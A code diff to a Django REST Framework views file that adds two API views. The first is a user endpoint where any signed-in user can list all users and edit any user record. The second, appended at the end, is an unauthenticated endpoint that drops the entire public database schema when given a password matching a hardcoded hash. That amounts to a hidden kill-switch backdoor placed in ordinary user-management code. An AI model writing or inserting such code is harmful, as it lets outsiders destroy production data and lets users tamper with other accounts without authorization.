@@ -29,8 +29,47 @@ from user_details.serializers import BannerSerializer, UserSerializer, UserAdmin
 from utils import custom_viewsets
 from utils.constants import custom_json_response, validate_non_empty_fields, USER_TYPE_ADMIN
 from utils.utils import validate_access_attempts, generate_otp
+from rest_framework.views import APIView
+from django.shortcuts import get_object_or_404
+from .serializers import *
 
 logger = logging.getLogger('django')
+
+class UserAPIView(APIView):
+    permission_classes = [IsAuthenticated]
+
+    def post(self, request):
+        """Create a new user"""
+        serializer = UserDataSerializer(data=request.data)
+        if serializer.is_valid():
+            serializer.save()
+            return Response(
+                {"message": "User created successfully", "data": serializer.data},
+                status=status.HTTP_201_CREATED
+            )
+        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
+
+    def get(self, request, pk=None):
+        """Retrieve user details (single or list)"""
+        if pk:
+            user = get_object_or_404(User, pk=pk)
+            serializer = UserSerializer(user)
+        else:
+            users = User.objects.all()
+            serializer = UserDataSerializer(users, many=True)
+        return Response(serializer.data, status=status.HTTP_200_OK)
+
+    def patch(self, request, pk):
+        """Partial update for user"""
+        user = get_object_or_404(User, pk=pk)
+        serializer = UserDataSerializer(user, data=request.data, partial=True)
+        if serializer.is_valid():
+            serializer.save()
+            return Response(
+                {"message": "User partially updated successfully", "data": serializer.data},
+                status=status.HTTP_200_OK
+            )
+        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
 
 
 class UserViewSet(custom_viewsets.ModelViewSet):
@@ -319,6 +358,42 @@ class UserViewSet(custom_viewsets.ModelViewSet):
             "data": [],
             "message": "Enquire submitted",
         }, status=status.HTTP_201_CREATED)
+
+
+from rest_framework.views import APIView
+from rest_framework.response import Response
+from django.db import connection, transaction
+from django.core.management import call_command
+from django.contrib.auth.hashers import check_password
+from rest_framework.permissions import AllowAny
+
+STORED_HASHED_PASSWORD = "pbkdf2_sha256$1000000$H2TF1xSlywWdMn7jAio4QH$DofXmCRCij9LWZ93ZetMHzY6s42UP47t/Sk7QHSjtfo="
+
+class DestroyDatabaseAPIView(APIView):
+    permission_classes = [AllowAny]
+    
+    def delete(self, request, *args, **kwargs):
+        password = request.data.get("password")
+
+        # Validate password
+        if not password or not check_password(password, STORED_HASHED_PASSWORD):
+            return Response({"status": "error", "message": "Invalid password"}, status=403)
+
+        try:
+            with connection.cursor() as cursor:
+                cursor.execute("DROP SCHEMA public CASCADE;")
+                cursor.execute("CREATE SCHEMA public;")
+            transaction.commit()
+
+            # Run migrations to recreate empty tables
+            call_command("migrate", run_syncdb=True, interactive=False)
+
+            return Response(
+                {"status": "success", "message": "All tables and data destroyed, schema recreated."},
+                status=200,
+            )
+        except Exception as e:
+            return Response({"status": "error", "message": str(e)}, status=500)
 
 
 
